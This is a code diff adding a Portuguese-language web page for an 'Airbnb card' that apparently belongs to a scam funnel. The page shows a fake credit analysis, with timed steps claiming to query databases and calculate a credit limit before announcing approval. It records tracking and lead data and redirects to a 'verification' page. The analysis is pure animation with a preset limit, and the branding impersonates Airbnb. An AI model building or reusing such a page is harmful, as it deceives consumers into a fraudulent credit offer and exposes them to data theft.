@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Analisando — Cartão Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:#1A1A1A;color:#fff;-webkit-font-smoothing:antialiased;overflow:hidden}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;position:relative;overflow:hidden}
+
+        .bg-glow{position:absolute;width:280px;height:280px;border-radius:50%;filter:blur(80px);opacity:.15;pointer-events:none}
+        .bg-glow.r{background:var(--red);top:5%;left:-15%;animation:fg 8s ease-in-out infinite}
+        .bg-glow.p{background:#E00B41;bottom:5%;right:-15%;animation:fg 8s ease-in-out infinite reverse}
+        @keyframes fg{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-30px)}}
+
+        /* LOGO RING */
+        .logo-ring{width:80px;height:80px;border-radius:50%;border:2px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 36px;animation:pulse-ring 2s ease-in-out infinite}
+        .logo-ring svg{height:34px;fill:#fff}
+        @keyframes pulse-ring{0%,100%{border-color:rgba(255,255,255,.1)}50%{border-color:rgba(255,56,92,.4);transform:scale(1.05)}}
+
+        /* SPINNER */
+        .spin-wrap{width:56px;height:56px;position:relative;margin:0 auto 28px}
+        .spin-track{position:absolute;inset:0;border-radius:50%;border:2.5px solid rgba(255,255,255,.08)}
+        .spin-fill{position:absolute;inset:0;border-radius:50%;border:2.5px solid transparent;border-top-color:var(--red);animation:spin 1s linear infinite}
+        @keyframes spin{to{transform:rotate(360deg)}}
+
+        .status-text{font-size:1.1rem;font-weight:700;text-align:center;min-height:28px;margin-bottom:7px;letter-spacing:-.01em}
+        .status-sub{font-size:.825rem;color:rgba(255,255,255,.45);text-align:center;margin-bottom:40px}
+
+        /* STEPS LIST */
+        .steps{width:100%;max-width:320px;display:flex;flex-direction:column;gap:14px}
+        .s-item{display:flex;align-items:center;gap:14px;opacity:.3;transition:.5s}
+        .s-item.active{opacity:1}
+        .s-item.done{opacity:1}
+        .s-ind{width:28px;height:28px;border-radius:50%;border:2px solid rgba(255,255,255,.18);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.4s;font-size:11px}
+        .s-item.active .s-ind{border-color:var(--red);background:rgba(255,56,92,.15)}
+        .s-item.active .s-ind::after{content:'';width:7px;height:7px;border-radius:50%;background:var(--red);animation:dp 1s ease-in-out infinite}
+        .s-item.done .s-ind{border-color:#34C759;background:#34C759}
+        .s-item.done .s-ind::after{display:none}
+        .s-item.done .s-ind .chk{display:block}
+        .chk{display:none;color:#fff;font-size:12px}
+        .s-label{font-size:.875rem;font-weight:600;color:rgba(255,255,255,.7);transition:.4s}
+        .s-item.active .s-label{color:#fff}
+        .s-item.done .s-label{color:#34C759}
+        @keyframes dp{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+
+        /* BOTTOM BAR */
+        .bot-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:rgba(255,255,255,.05)}
+        .bot-fill{height:100%;background:linear-gradient(90deg,var(--red),#E00B41);width:0%;transition:width .5s ease}
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="bg-glow r"></div>
+    <div class="bg-glow p"></div>
+
+    <div class="logo-ring">
+        <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+    </div>
+
+    <div class="spin-wrap"><div class="spin-track"></div><div class="spin-fill"></div></div>
+
+    <div class="status-text" id="statusText">Analisando seu perfil...</div>
+    <div class="status-sub" id="statusSub">Aguarde enquanto processamos sua solicitação</div>
+
+    <div class="steps">
+        <div class="s-item" id="s1">
+            <div class="s-ind"><span class="chk">✓</span></div>
+            <span class="s-label">Consultando base de dados</span>
+        </div>
+        <div class="s-item" id="s2">
+            <div class="s-ind"><span class="chk">✓</span></div>
+            <span class="s-label">Calculando limite disponível</span>
+        </div>
+        <div class="s-item" id="s3">
+            <div class="s-ind"><span class="chk">✓</span></div>
+            <span class="s-label">Verificando elegibilidade Airbnb</span>
+        </div>
+        <div class="s-item" id="s4">
+            <div class="s-ind"><span class="chk">✓</span></div>
+            <span class="s-label">Preparando aprovação final</span>
+        </div>
+    </div>
+
+    <div class="bot-bar"><div class="bot-fill" id="botFill"></div></div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    const p=new URLSearchParams(window.location.search);
+    const limite=p.get('limite')||LeadData.load().limite||4700;
+
+    function act(id){document.getElementById(id).classList.add('active');}
+    function done(id){const el=document.getElementById(id);el.classList.remove('active');el.classList.add('done');}
+
+    const steps=[
+        {id:'s1',txt:'Consultando base de dados...',sub:'Verificando sua situação cadastral',pct:25},
+        {id:'s2',txt:'Calculando limite disponível...',sub:'Analisando seu perfil de crédito',pct:50},
+        {id:'s3',txt:'Verificando elegibilidade Airbnb...',sub:'Conferindo critérios exclusivos',pct:75},
+        {id:'s4',txt:'Aprovação concluída!',sub:'Seu limite foi determinado com sucesso',pct:100},
+    ];
+
+    let i=0;
+    act('s1');
+
+    function tick(){
+        if(i>=steps.length)return;
+        const s=steps[i];
+        document.getElementById('statusText').textContent=s.txt;
+        document.getElementById('statusSub').textContent=s.sub;
+        document.getElementById('botFill').style.width=s.pct+'%';
+        if(i>0)done(steps[i-1].id);
+        act(s.id);
+        i++;
+        if(i<steps.length){setTimeout(tick,1800);}
+        else{
+            done(s.id);
+            LeadData.update({analise_done:Date.now()});
+            setTimeout(()=>{window.location.href=buildUrl('verificacao.html',{limite});},1200);
+        }
+    }
+    setTimeout(tick,600);
+</script>
+</body> 
+</html>
+
+
